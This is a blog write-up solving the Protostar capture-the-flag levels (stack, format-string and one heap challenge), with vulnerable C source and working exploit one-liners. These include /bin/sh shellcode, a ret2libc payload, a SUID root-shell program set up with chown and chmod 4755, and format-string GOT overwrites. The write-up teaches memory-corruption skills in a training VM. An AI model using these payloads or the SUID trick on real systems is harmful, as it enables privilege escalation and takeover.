---
title: "Protostar CTF"
excerpt_separator: "<!--more-->"
tags:
  - ctf
categories:
  - tech
---

![center-aligned-image](https://cdn.pixabay.com/photo/2011/12/14/12/17/galaxy-11098_1280.jpg){: .align-center}

CTF by **Andrew Griffiths** @ [https://exploit.education/protostar/](https://exploit.education/protostar/)
{: .notice--info}

This Capture the Flag introduces system internals concepts like sockets and networking, stack and heap overflows, format strings and byte ordering.
I guess I will be googling most of that and do my best to keep track of the steps, and see to get help from the ones that are much better at me in these topics.

<!--more-->

| Content: | 
|---------------------|----------------------|------------------------|--------------------|------------------|----------------------|
| [Install](#install) |	[Stack 0](#stack-00) | [Format 0](#format-00) |	[Heap 0](#heap-00) | [Net 0](#net-00) |	[Final 0](#final-00) |
|---------------------|----------------------|------------------------|--------------------|------------------|----------------------|
|                     | [Stack 1](#stack-01) | [Format 1](#format-01) |	[Heap 1](#heap-01) | [Net 1](#net-01) |	[Final 1](#final-01) |
|---------------------|----------------------|------------------------|--------------------|------------------|----------------------|
|                     |	[Stack 2](#stack-02) | [Format 2](#format-02) |	[Heap 2](#heap-02) | [Net 2](#net-02) |	[Final 2](#final-02) |
|---------------------|----------------------|------------------------|--------------------|------------------|----------------------|
|                     |	[Stack 3](#stack-03) | [Format 3](#format-03) | [Heap 3](#heap-03) |
|---------------------|---------------------|-----------------------|-----------------------|-----------------------|-----------------------|
|                     | [Stack 4](#stack-04) | [Format 4](#format-04)
|---------------------|---------------------|-----------------------|-----------------------|-----------------------|-----------------------|
|                     | [Stack 5](#stack-05)
|---------------------|---------------------|-----------------------|-----------------------|-----------------------|-----------------------|
|                     | [Stack 6](#stack-06)
|---------------------|---------------------|-----------------------|-----------------------|-----------------------|-----------------------|
|                     | [Stack 7](#stack-07)
|---------------------|---------------------|-----------------------|-----------------------|-----------------------|-----------------------|

# Capture the Flag

### [Install]
The CTF is downloadable as ISO image, and needs to be mounted. \
To mount it use VirtualBox (or VMware or similar) and create a Debian 32bits machine, then pass the iso as bootable media. \
For each level, access the machine with the username "user" and the password "user".
To access, retrieve the IP of the CTF machine, for example with the `ip a` command.
Then connect to the machine with SSH, using the credentials and the command ssh user@[ipaddr]. \
All the challenges are stored in `/opt/protostar/bin/`. \
If you want to install anything in the VM, you can login with the `godmode:godmode` credentials. \
*Protostar is little endian, this is important to keep in mind when playing with direct memory access*

### [Stack 00]
Memory can be accessed outside of its allocated region.

```c
int main(int argc, char **argv){
    volatile int modified;
    char buffer[64];

    modified = 0;
    gets(buffer);

    if(modified != 0) {
        printf("you have changed the 'modified' variable\n");
    } else {
        printf("Try again?\n");
    }
}
```

> Buffer overflow: this bug happens when a program, while writing data to a buffer, overruns the buffer's boundary and overwrites adjacent memory locations. Buffer overflows can often be triggered by assuming all the inputs are smaller than a certain size and allocating just that size for the buffer: in case an input happens to be larger, it will be written past the end of the buffer.

1. The program declares an integer variable and a buffer of static length 64 bytes. This means that memory will look as follows (remember, protostar is little endian): `modified ; modified ; modified ; buffer[63] ; buffer[62] ; ... ; buffer[1] ; buffer[0]`
2. The goal is to overwrite the "modified" variable, meaning that we have to write out of the boundaries of the buffer. Luckily there are no boundary checks in place.
3. The only thing we have to do is to start ``./stack0` and give it an input string longer than 64 chars. The additional chars will spill out of the buffer and overwrite the memory cell of the "modified" variable.


### [Stack 01]
Modify variables to specific values.

```c
int main(int argc, char **argv){
    volatile int modified;
    char buffer[64];

    if(argc == 1) {
        errx(1, "please specify an argument\n");
    }

    modified = 0;
    strcpy(buffer, argv[1]);

    if(modified == 0x61626364) {
        printf("you have correctly got the variable to the right value\n");
    } else {
        printf("Try again, you got 0x%08x\n", modified);
    }
}
```

> ASCII: this is a character encoding standard: it encodes 128 specified characters into seven-bit integers as shown by the ASCII chart (you can see it in a terminal by tayping man ascii). Ninety-five of the encoded characters are printable: these include the digits 0 to 9, lowercase letters a to z, uppercase letters A to Z, and punctuation symbols. 

1. What the program does is basically the same as in stack0. The main difference is that we have to pass the string as a parameter when we start ./stack1, instead of the program itself reading it from standard input.
2. Instead of overwriting the variable with no matter what, we have to make the value correspond with the expected check: 0x61626364. We can't write the numbers directly, as every number will be interpreted as a char and therefore not correspond. However, taking a look at the ASCII table we see that the values correspond to a, b, c and d.
3. Remembering that the system is little endian, it means that the string has to be passed as "dcba". As in the previous level, whatever are the first 64 characters does not matter. We can therefore do the following: `./stack1 1111111111111111111111111111111111111111111111111111111111111111dcba`

### [Stack 02]
Look at environment variables, and how they can be set.

```c
int main(int argc, char **argv){
    volatile int modified;
    char buffer[64];
    char *variable;

    variable = getenv("GREENIE");

    if(variable == NULL) {
        errx(1, "please set the GREENIE environment variable\n");
    }

    modified = 0;

    strcpy(buffer, variable);

    if(modified == 0x0d0a0d0a) {
        printf("you have correctly modified the variable\n");
    } else {
        printf("Try again, you got 0x%08x\n", modified);
    }
}
```

> Environment Variable: it'ss a dynamic-named value that can affect the way a processes will behave on a computer. These variables are part of the environment in which a process runs, and they can be queried to find out paths to specific files or directories.

1. Exactly as in the previous levels, we have to fill the buffer and then add some to overwrite the desired memory. However in this case the string is not taken as parameter nor from the standard input: it is instead read directly from an environment variable.
2. To assign a value to an environment variable it is enough to run `export VARNAME=xxxx`. However, we can not reutilize the string we passed the last time because in this case the expected string is made of special characters. If we look in the ASCII table they correspond to the new line and carriage return, and we can not represent them in a single char in our string.
3. To go around the problem we can try to set the variable using python, which allows to print the raw byte values:
    ```python
        export GREENIE=`python -c "print '1' * 64 + '\x0a\x0d\x0a\x0d'"`
    ```
4. However, if we run this line the terminal will complain about a bad variable name, and only store the part with 1s.
5. Therefore, we have to set the variable directly when launching the program. This is possible by giving the variable name and its value in before the usual program launch command, all in the same line: 
    ```python
        GREENIE=`python -c "print 'A' * 64 + '\x0a\x0d\x0a\x0d'"` ./stack2
    ```
    
### [Stack 03]
Overwrite function pointers stored on the stack.

```c
void win(){
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv){
    volatile int (*fp)();
    char buffer[64];

    fp = 0;

    gets(buffer);

    if(fp) {
        printf("calling function pointer, jumping to 0x%08x\n", fp);
        fp();
    }
}
```

> objdump: this command displays information about an object file. It has many parameters that change what is shown: among other possibilities you can see the content of the headers and sections, some disassembly, symbol tables, formats and architectures.

> |: the vertical line is used to pump output from an instruction to the next instruction

1. As in the previous challenges, we have to overwrite a variable by overflowing the input buffer. This time the string is read from stdin, but it will again be made of special characters because we have to provide an address.
2. This address is a pointer to the location of the `win()` method. So the first thing to do is to find out where that method is: 

    ```bash
        objdump -t stack3 | grep win # use grep to get only relevant output
    ```
3. This shows that the function is at address 0x08048424. Remembering that the system is little endian, it means that we will have to pass it as a string of form \x24\x84\x04\x08. 
4. As in the previous challenge, we have to use a workaround to get the special characters properly. We don't have to write any variable, so we can do directly `python -c "print 'A' * 64 + '\x24\x84\x04\x08'" | ./stack3.`

### [Stack 04]
Overwrit saved EIP and standard buffer overflows.

```c
void win(){
    printf("code flow successfully changed\n");
}

int main(int argc, char **argv){
    char buffer[64];

    gets(buffer);
}
```

> EIP: it's a 32 bit register, also called the instruction pointer because Instruction it holds the next instruction address. Based on usual calling conventions, the call instruction pushes the current $eip onto the stack before jumping to the memory address of the called function by setting $eip to that address. The ret instruction at the end of the function will pop the old $eip value, located at that moment on the stack at $ebp + 4, and restore it to continue the execution. 

1. This challenge is slightly different from the previous ones, because we don't have a variable to overwrite. Instead we have to overwrite a register, which is not immediately after the memory allocated for the buffer.
2. To find out what the address of `$eip` is we can use gdb and ask for `info reg`. This tells us that `$eip` is at address 0x8048411
3. What we have to find out now is how far the `$eip` location is from our buffer, so that we can calculate how many chars we have to pass to overwrite the right location. We could look at the address of the buffer itself, with for example IDA Pro or GDB and a little work to calculate the locations. Or we could use a tool like *Buffer Overflow EIP Offset String Generator*, which will generate a unique string that we feed to the program, and by giving back the content of $eip to the service it will tell us the offset between the start of the string (in our case corresponding to the address of the buffer) and the start of the $eip content (corresponding to the address of $eip).
4. We start the program in gdb and let it run. When the input is needed, we paste the string generated by the service mentioned in the previous step. When we hit enter, the program will end up in a segmentation fault because it is trying to access an address that does not exist. That's the moment to check our register with `x/w $eip`, and see what is the content (which by the way corresponds to the address that caused the segmentation fault). We copy it back to the service, which tells us that the offset we are looking for is 76.
5. Now that we know how long our non-relevant string has to be, we can retrieve the relevant part: the address of the `win()` method. We use objdump again, and we obtain the address 0x080483f4.
6. Exactly as the previous challenge, we can trigger the overflow and redirect the execution to the `win()`` method with `python -c "print 'A' * 76 + '\xF4\x83\x04\x08'" | ./stack4`

### [Stack 05]
Standard buffer overflow, introducing shellcode.

```c
int main(int argc, char **argv){
    char buffer[64];
    gets(buffer);
}
```

> Shellcode: this is a small piece of self-contained code used as payload in the exploitation of a software vulnerability. It is called "shellcode" because it typically starts a command shell from which the attacker can control the compromised machine, but it can actually do anything. Shellcodes can be encoded in many different ways, the most simple translates high level instructions to the corresponding assembly and from there to the corresponding opcodes, which are just hex values. 

1. This challenge starts exactly the same as the previous one: our goal is to overwrite `$eip` with the address of our own code. To know how much input we have to give to reach $eip and overwriting it properly we can do exactly the same steps as previous: take the input from the website, execute the program in gdb, pass the input and when it crashes give it back to the website. The result is that once again we need 76 bytes to reach $eip, and that $eip is at address 0x8048411
2. However this time we don't have a pre-written function to redirect our flow to. The goal is to use our own shellcode (well, not necessarily written by us, but passed to the program by us), and the only way to inject it in the program is to put it as our input for the buffer. We will use this shellcode from exploit-db:

    ```c
    /* The asm instructions correspond t:
        * close(0) 
        * open("/dev/tty", O_RDWR | ...)
        * execve("/bin/sh", ["/bin/sh"], NULL)
    */
        
    char sc[] = 
    "\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
    "\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
    "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
    ```

3. Now we have our input made by the shellcode and the padding (meaning a bunch of \x00 bytes) we need to reach $eip. But we do not know yet what we have to write in $eip: we will have to pass the starting address of the buffer, where the program will find the start of the shellcode.
4. By disassembling stack5 with `objdump -d` we can see that the address of the buffer passed as argument to the gets method is loaded in $eax and is located at $esp+0x10. This means that the address we are looking for corresponds to $esp+0x10, and from gdb we can see that $esp is located at 0xbffffb70.

    ```c
    080483c4 main:
    80483c4:   55                      push   %ebp
    80483c5:   89 e5                   mov    %esp,%ebp
    80483c7:   83 e4 f0                and    $0xfffffff0,%esp
    80483ca:   83 ec 50                sub    $0x50,%esp
    80483cd:   8d 44 24 10             lea    0x10(%esp),%eax
    80483d1:   89 04 24                mov    %eax,(%esp)
    80483d4:   e8 0f ff ff ff          call   80482e8 gets@plt
    80483d9:   c9                      leave  
    80483da:   c3                      ret  
    ```
    
5. The problem is that the actual address of $esp might change on the stack depending on how the program is loaded. So we need another way to access the buffer. What we can see from the disassembly is that the address is loaded in $eax. This means that if we find an instruction like jmp $eax at a static address we could use that address for our new $eip, and the jump will take care of getting us at the right spot.
6. To find that gadget we can use a tool like `msfelfscan`: by passing the object file and the type of instruction (in our case -j) we are looking for it will return all the addresses where we can find one. Therefore we run `msfelfscan -f stack5 -j eax` and see that we can use the instruction `call eax` at 0x080483bf for our goal.
7. Our current payload is made by the shellcode, a padding of 76-len(shellcode) 0-bytes and the address of our call eax instruction.

    ```bash
    python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '0' * 21 + '\xBF\x83\x04\x08'" | ./stack5
    ```
8. If we pipe all of that into stack5, we expect to receive a shell back, but instead we get a segmentation fault. The reason is that in our shellcode we have a bunch of push instructions that when executed will put things on the stack basically overwriting instructions already there.
9. To prevent that, we have to ensure that $esp is pointing to a proper location to not interfere with our code when stuff is pushed into the stack. What we can do is moving the register back so that it will leave enough space for all the pushes in our code. The instruction can be like `add $0x10, $esp`, which translates to opcode \x83\xc4\x10.
10. We prepend this to our code, obtaining
    ```bash
    python -c "print '\x83\xc4\x10\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '0' * 18 + '\xBF\x83\x04\x08'" | ./stack5
    ```
11. Running this code clearly returns a shell that is root (you can check it with the command whoami).

### [Stack06]
Now there are restrictions on the return address.

```c
void getpath(){
    char buffer[64];
    unsigned int ret;

    printf("input path please: "); fflush(stdout);

    gets(buffer);

    ret = __builtin_return_address(0);

    if((ret & 0xbf000000) == 0xbf000000) {
        printf("bzzzt (%p)\n", ret);
        _exit(1);
    }

    printf("got path %s\n", buffer);
}

int main(int argc, char **argv){
    getpath();
}
```

> return-to-libc: this attack usually uses a buffer overflow to replace a return address so that it points to another routine already in memory (meaning taken from a library), so the attacker doesn't need to inject its own code. These target library is usualy libc, because it is almost always linked and contains functions like system that can be used to execute shell commands. Check out a great explanation in Performing a ret2libc Attack by InVoLuNTaRy

> C calling convention: arguments of the function are pushed on the stack, in right-to-left order (meaning that last argument is pushed first). Integers and addresses are returned in the EAX register; registers EAX, ECX, and EDX are caller-saved, and the rest are callee-saved.

1. The approach to exploit this code could be the same as in the last challenge, but there is an additional trick: we can't modify the $eip to an instruction in the stack, because the `(ret & 0xbf000000) == 0xbf000000` makes sure that addresses in the stack will not be accepted as return addresses. We know that the stack is in that address space thanks to `gdb > info proc map`
2. By running `gdb > disas getpath` we can look into the assembly code of the `getpath` method. We see right before the call to the gets instruction that the buffer is loaded from `$ebp-0x4C`. We can not look for a gadget to jump to $eax, because $eax is changed multiple times during the execution. However the same location is loaded into $edx right before returning, and so finding a jump to that register could be a solution. But using `msfelfscan` doesn't return any useful gadget.
3. Therefore we try to approach the problem with a `ret2libc` attack. We want to invoke the system function, pass the proper command to be executed to it, and make it properly return to the exit function.
4. To locate system and exit in the library loaded by stack6, we can launch stack6 with gdb and use `gdb > print system` and `gdb > print exit`. This tells us that system is located at address 0xb7ecffb0, and exit at 0xb7ec60c0.
5. Our call to system should result to spawning a shell, and to do this we need to pass a pointer to a string containing the "/bin/sh" command to be executed. We could find this string in different locations: the first one that comes to mind might be the buffer itself. The only problem in this case is that we should pass the pointer to the start of the buffer, and that is not a fixed value.
6. As alternative, we look at environment variables: when a program is launched, the variables are put at the end of the stack, and they have a static address. We can either define our own variable, with `export PWN=/bin/sh`, or look if a variable pointing to the shell already exists. 
7. To get the address of the variable, we can start gdb, reach a breakpoint in stack6 and run `gdb > x/10s *((char **)environ)`, changing the amount of shown variables until we find the one we are interested in.
8. In our case, we have an existing `SHELL` variable located at 0xbffff8a9. To note is that we are only interested in the actual content of the variable, but in memory it is stored as a single string of the form `VARNAME=xxxxxxxx`. This means that to our address we have to add a little offset to leave out the name: "SHELL=" has 6 characters, so we add 6 to the address, obtaining 0xbffff8af
9. Our payload will have the following structure:
    - Buffer filler (80 bytes)
    - Pointer to system to overwrite $eip
    - Pointer to exit as the address to which system should jump when returning
    - Pointer to the content of SHELL as system argument
    - Whatever as exit argument
10. This is the result:

    ``` bash
    python -c "print 'A' * 80 + '\xb0\xff\xec\xb7' + '\xc0\x60\xec\xb7' + '\xaf\xf8\xff\xbf' + '\xff\xff\xff\xff'" | ./stack6
    ```
11. Executing the previous command should result in a root shell. However, on my system it does not work. Might be the pointers slightly off, or something else. Honestly, I've no idea.

A nice addition to this challenge is to make system give root permissions to whatever we want. This is not my idea, but sadly I can't find the source anymore. The approach is the same as the rest of the challenge, we just change the command that we pass to system. A nice example is writing a small C program that calls a shell with the SUID bit set:

```c
    int main(int argc, char **argv, char **envp) {
        gid_t gid;
        uid_t uid;

        gid = getegid();
        uid = geteuid();

        setresgid(gid, gid, gid);
        setresuid(uid, uid, uid);

        system("/bin/bash");
    }
```

We then compile the file and create an environment variable that will change the owner and the permissions of the binary: `export SUID="/bin/chown root:root /home/user/shell; /bin/chmod 4755 /home/user/shell"`. With the approach explained in the previous steps we retrieve the pointer to the string command, and we pass that as argument to system. After running properly, our binary file should have root owner and SUID set, and running it will result in a root shell.

### [Stack 07]
Looking through the disassembled program for specific instructions.

```c
char *getpath(){
    char buffer[64];
    unsigned int ret;

    printf("input path please: "); fflush(stdout);

    gets(buffer);

    ret = __builtin_return_address(0);

    if((ret & 0xb0000000) == 0xb0000000) {
        printf("bzzzt (%p)\n", ret);
        _exit(1);
    }

    printf("got path %s\n", buffer);
    return strdup(buffer);
}

int main(int argc, char **argv){
    getpath();
}
```

> ROP chains: taking control of the call stack in a program, it is possible to make calls to specific sequences of instructions (called gadgets) alredy present in the code, that usually end with a return so that the following instruction might also be a call to another gadget. Chaining gadgets together it is possible to perform arbitrary operations on a machine. 

1. This level has the same setup as the previous one, but the non-executable part of the stack is much larger, causing our pool of possible return addresses to get much smaller. We will therefore try to use the same approach as in Stack 5, by finding a gadget that will allow us to jump at the proper place.
2. If we do a disassemble with `gdb > disas getpath` we can see that our buffer is stored at `$ebp-0x4c`, and that this address is loaded into $eax just before the method returns. This means that the value in $eax will still be there when we will be looking at the return address, meaning we could aim at returning exactly at that specific address.
3. To find a way to jump to $eax we look for possible gadgets in our code. To do that we execute `msfelfscan -f ~/stack7 -j eax`, meaning that we are looking in stack7 for code that jumps to $eax, being it a call, a return or whatever else would result in reaching that address. The script tells us that at address 0x080484bf there is a call to $eax that does exactly what we need
4. With the usual service we check how many bytes we have to fill to go from the buffer to $eip, and the result is 80. We build our payload with the same shellcode we already used, then pad it with 25 bytes to reach the position of $eip, and as last element we give the address of our gadget:

    ```bash
    python -c "print '\x31\xc0\x31\xdb\xb0\x06\xcd\x80' + '\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + 'A' * 25 + '\xbf\x84\x04\x08'" | ./stack7
    ```

5. Upon executing this, we will be rewarded with a root shell.

### [Format 00]
String supplied directly to printing functions can contain malicious formatting

```c
void vuln(char *string){
    volatile int target;
    char buffer[64];

    target = 0;

    sprintf(buffer, string);
    
    if(target == 0xdeadbeef) {
        printf("you have hit the target correctly :)\n");
    }
}

int main(int argc, char **argv){
    vuln(argv[1]);
}
```

1. This task can be solved with a simple overflow: fill the buffer with whatever, put the expected value in the bytes that will act as overflow and overwrite the target variable. Remember that the system is little endian and therefore the bytes have to be passed "backwards". Also, the string has to be passed as parameter, and not piped into stdin.

    ```bash
    ./format0 `python -c "print 'A' * 64 + '\xef\xbe\xad\xde'"`
    ```

### [Format 01]
Modify arbitrary memory locations

```c
int target;

void vuln(char *string){
    printf(string);
    
    if(target) {
        printf("you have modified the target :)\n");
    }
}

int main(int argc, char **argv){
    vuln(argv[1]);
}
```

> Format Strings: this string contains both text and format parameters, that are pushed on the stack and popped by the calling function. This function retrieves first the format string itself, and while parsing it pops the other values from the stack and treats them as defined by the format. Following formats are the most popular: %d for int, %u for uint, %s for *char.
> Interesting formats are %x for hex and %n for numbers of bytes written so far: with the first one it is possible to force the popping of values from the stack, because the string parsing does not know that what is being popped is not a legitimate parameter; combining this with the second one it is possible to force writing on a specific address, just by popping until that address is on the top of the stack and then invoking %n so that it will write its result there. 

1. The first thing that we need to do is to find out where target is, so that we know which at address we have to write. To do this we can use `objdump -t format1 | grep target`, which will tell us that the variable is stored at address 0x08049638
2. The goal is to use this address as parameter for a %n operation: to make this work we need to crawl along the stack and pop all that we find until that address is on the top.
3. To find out how many 4-bytes blocks we have to pop, we do some bruteforcing: we spam format1 with an input that is easy to recognize, like 'AAAA' (that corresponds to 41414141 in ASCII hex), and we pop a big number of blocks by appending a bunch of '%x' to the string:

    ```bash
    ./format1 `python -c "print 'AAAA' + '%x' * 150"`
    ```

4. The result is an ugly bunch of numbers, corresponding to the content of the stack. If we look at it with a bit of attention, we can identify the 41414141, towards the end. We repeat the spamming decreasing the number of '%x' that we print, until the recognizable pattern is at the last 4 bytes that we pop. In this case, 142 is the perfect number.
5. While decreasing the number of pops that we do, there are alignment problems that might arise. We need to be able to control exactly the last 4 bytes, so it might be needed to modify a bit our recognizable patters, like 'AABBCCDD', so that even if the alignment is not perfect we should be able to identify 4 consecutive byte shat we can take control of.
6. When we have the 4 bytes under control, we change them: instead of our known pattern, we put there the address of target that we retrieved earlier. As we are using python, hex values are written with backslash and x, and we have to keep an eye on the endianness:

    ```bash
    ./format1 `python -c "print '\x38\x96\x04\x08' + '%x' * 142"`
    ```

7. The last step is to have something written to that address: to do this we swap the last '%x' with a '%n', so that the address will be popped and used as a pointer to write the amount of bytes that have been written until now. The challenge is solved.

    ```bash
    ./format1 `python -c "print '\x38\x96\x04\x08' + '%x' * 141 + '%n'"`
    ```

### [Format 02]
Write specific values in memory

```c
int target;

void vuln(){
    char buffer[512];

    fgets(buffer, sizeof(buffer), stdin);
    printf(buffer);
    
    if(target == 64) {
        printf("you have modified the target :)\n");
    } else {
        printf("target is %d :(\n", target);
    }
}

int main(int argc, char **argv){
    vuln();
}
```

> Counting format strings: by providing a number between the percentage and the letter, the resulting format string will write that amount of elements. This means that it is possible to control what is written by %n: for example by using %Xu%n the result will be %n writing exactly value X because that's the amount of bytes that have been outputted. 

1. The challenge is similar to the previous one, but this time we have to write a specific value into target, and not just a random one. Again, we start using `objdump -t format2 | grep target` to find out that target is at address 0x080496e4
2. Time to spam format2 to find out how many pops we have to do to get the target address at the right place at the top of the stack:

    ```bash
    python -c "print 'AAAA' + '%x'*20" > /tmp/format2.in
    ./format2 < /tmp/format2.in
    ```

3. This time, turns out that we are looking really close, as the right amount of pops is 4. We swap our pattern with the target address, we remove a pop and instead put a '%n' in there.

    ```bash
    python -c "print '\xe4\x96\x04\x08' + '%x%x%x' + '%n'" > /tmp/format2.in
    ./format2 < /tmp/format2.in
    ```

4. This time we should see that a new value has been written to our target: the target has the value 23. Now it's just a matter to convince the system to print more bytes without popping more stuff from the stack.
5. To do that we make one of our '%x' pad its popped value with the amount of bytes we are missing. It might be necessary to try different values until we find the correct amount of padding (remember that target is a hex value).

    ```bash
    python -c "print '\xe4\x96\x04\x08' + '%44x%x%x' + '%n'" > /tmp/format2.in
    ./format2 < /tmp/format2.in
    ```
    
6. As soon as we get the correct amount of bytes printed out, target will be modified to contain the value 64 and allowing us to finish the challenge.


### [Format 03]
Control what data is being written to the process memory.

```c
int target;

void printbuffer(char *string){
    printf(string);
}

void vuln()
{
    char buffer[512];

    fgets(buffer, sizeof(buffer), stdin);

    printbuffer(buffer);
    
    if(target == 0x01025544) {
        printf("you have modified the target :)\n");
    } else {
        printf("target is %08x :(\n", target);
    }
}

int main(int argc, char **argv){
    vuln();
}
```

1. Once again, we build on the previous challenge: we have to write a specific value, and this time we can't do it on a single write but need to split it on multiple %x-%n runs. We start using `objdump -t format3 | grep target` to find out that target is at address 0x080496f4
2. Next step, spamming format3 to find out how many pops we have to do to get the target address at the right place at the top of the stack:
    ```bash
    python -c "print 'AAAA' + '%x'*20" > /tmp/format3.in
    ./format3 < /tmp/format3.in
    ```

3. Correct pop amount is 12. We swap our pattern with the target address, we remove a pop and instead put a '%n' in there.
    ```bash
    python -c "print '\xf4\x96\x04\x08' + '%x%x%x%x%x%x%x%x%x%x%x' + '%n'" > /tmp/format3.in
    ./format3 < /tmp/format3.in
    ```
4. This results in writing target lowest byte pair with 41. Therefore we need to add a couple of bytes in what we print with the '%x' to increase that value:
    ```bash
    python -c "print '\xf4\x96\x04\x08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n'" > /tmp/format3.in
    ./format3 < /tmp/format3.in
    ```
5. The next step requires to write to the second-lowest byte pair. We repeat the spamming with a known patter appending it to the string that we already have. Note that we inserted also 'BBBB' in our spamming pattern, because on a first run just with 'AAAA' it looked like the bytes were not aligned properly to result in a clean address after the popping. After playing around, the right amount of pops is 8.
    ```bash
    python -c "print '\xf4\x96\x04\x08' + '%4x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AABBBBAA%x%x%x%x%x%x%x%x'" > /tmp/format3.in
    ./format3 < /tmp/format3.in
    ```
6. Our destination address is still the target address, but incremented by one as we are writing to a higher position. So, in our new string swap the pattern at the right position with the address, and replace the last '%x' with '%n'. Another two bytes of target will be written.
    ```bash
    python -c "print '\xf4\x96\x04\x08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA\xf5\x96\x04\x08AA%473x%x%x%x%x%x%x' + '%n'" > /tmp/format3.in
    ./format3 < /tmp/format3.in
    ```
7. To get the right value in target we have to put a rather high value in the bytes printed by '%x'. This does not matter, even if it overflows, because we will be anyway overwriting the higher byte in the next step.
8. Repeat the last steps for the remaining bytes, remembering to increase the target address by one. When all the bytes are done and contain the right value, the challenge is done.

    ```bash
    python -c "print '\xf4\x96\x04\x08' + '%04x%x%x%x%x%x%x%x%x%x%x' + '%n' + 'AA\xf5\x96\x04\x08AA%473x%x%x%x%x%x%x' + '%n' + 'BBB\xf7\x96\x04\x08%125x%x%x%x%x%x' + '%n'" > /tmp/format3.in
    ./format3 < /tmp/format3.in
    ```

### [Format 04]
Redirect execution in a process

```c
int target;

void hello(){
    printf("code execution redirected! you win\n");
    _exit(1);
}

void vuln(){
    char buffer[512];

    fgets(buffer, sizeof(buffer), stdin);

    printf(buffer);

    exit(1);   
}

int main(int argc, char **argv){
    vuln();
}
```

> Global Offset Table: also called GOT, it is a table of addresses stored in the data section. During runtime it lists addresses of global variables: when the program runs for the first time, the GOT is initialized to 0x00000000 for every external function; the first time it runs that function, it will cache the actual memory address in the GOT, so that it doesn’t have to ask libc, or the corresponding library each time. To see the (uninitialized) GOT we can use objdump -R

> Buffer size: to overwrite an address, we need to know exactly how far we have to write in our buffer. To do this, we can take the target address (let's say 0x080484b4) and split it in byte pairs (b4, 84, 08, 08 little endian).
> We get the first offset by starting gdb, executing the program and looking at the content of the address of the function that we want to overwrite (this address is the one showed in the GOT). Let's say the value is 0x00000010: take the first byte pair and subtract this value to get the buffer length, meaning 0xb4 - 0x10 = 164. For the second one, take the 2nd byte pair (84) and subtract the first byte pair (b4). To correct the negative result we add a “1” in the most significant digit of the first number, meaning “184”. We then subtract again, and get 208.
> Doing this for all pairs results in the offsets that are needed to make the overwriting work at the correct places. 

> Direct Parameter Access: It allows us to reference subsequent printf arguments, without using the prior arguments: printf(“%4$d”, 1, 2, 3, 4, 5) will print 4.

1. The challenge is exactly the same as in the previous level, but instead of overwriting a variable we have to overwrite an address to which we want to jump. This address is the one of the `exit()` method (not _exit, as that would be called only after the exploit has already been done), that we can retrieve from the GOT table. The new address, meaning the one of the `hello()` method, is found with the usual command.

    ```bash
    objdump -R format4 | grep exit # target address is 0x08049724
    objdump -t format4 | grep hello # new address is 0x080484b4
    ```

2. There might be a little trick in the address of exit: if the method has never been executed before, what we get with the lookup is only the position in the GOT table. To actually know where the method is we need to fire up gdb, start up the program and look into what is in that address using `x/i 0x08049724`
3. Although it might be worth looking, executing format4 at least once before inspecting the GOT table should solve the problem. If you reach the end and there stuff is not working, maybe take a look at the last step and check that you are working with the proper address.
4. Next steps are exactly like format3: iteratively spam with a known pattern to find where to put the target address and how many pops are needed; actually insert the address and swap the last '%x' with '%n', check how many additional bytes you need to get the correct value at the desired place.
5. As we don't have a variable that will be printed with our results, checking that we are writing the right values at the right positions will require using gdb and constantly checking with `gdb > x/x 0x08049724`
6. The finished payload looks like the following:

    ```bash
    python -c "print '\x24\x97\x04\x08' + '%160x%x%x' + '%n' + 'A\x25\x97\x04\x08BBB' + '%184x%x%x' + '%n' + 'AA\x26\x97\x04\x08AA' + '%352x%x%x%x' + '%n' + 'A\x27\x97\x04\x08CDD' + '%228x%x%x%x' + '%n'" > /tmp/format4.in
    ./format4 < /tmp/format4.in
    ```

### [Heap 00]
Heap overflow to influence code flow

```c
struct data {
    char name[64];
};

struct fp {
    int (*fp)();
};

void winner(){
    printf("level passed\n");
}

void nowinner(){
    printf("level has not been passed\n");
}

int main(int argc, char **argv){
    struct data *d;
    struct fp *f;

    d = malloc(sizeof(struct data));
    f = malloc(sizeof(struct fp));
    f->fp = nowinner;

    printf("data is at %p, fp is at %p\n", d, f);

    strcpy(d->name, argv[1]);
    
    f->fp();
}
```

> void* malloc( size_t size ): allocates size bytes of uninitialized storage in the heap. If allocation succeeds, returns a pointer to the first byte in the allocated memory block that is suitably aligned for any object type. 

1. The core of this challenge is that the structs are initialized using malloc to be allocated in the heap. Structs d and f are allocated immediately after another, meaning that overflowing d results in overwriting f.
2. Our goal is to overwrite the function pointer defined in f with the address of the winner method. That address can be retrieved with `objdump -t heap0 | grep winner` and corresponds to 0x08048464
3. The next step is to find out how long does the input that is used to initialize d need to be to overwrite f and its function pointer. We use the same technique that we used for the stack challenges: run the program with gdb and the pattern:

    ```bash
    gdb --args heap0 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    ```

4. We can see what the content of $eip is when the program goes into segmentation fault, and passing this value back to the website tells us that we have an offset of 72 bytes.
5. The difference between this attack and the stack overflow attacks is that in this case we are not overwriting the return address in the stack, instead we are overwriting the content of f->fp. This means that the segmentation fault does not aries when returning from the strcpy call, but only at the moment when we try to call f->fp() and the pointer contained there (and stored in the heap) is not a proper address.
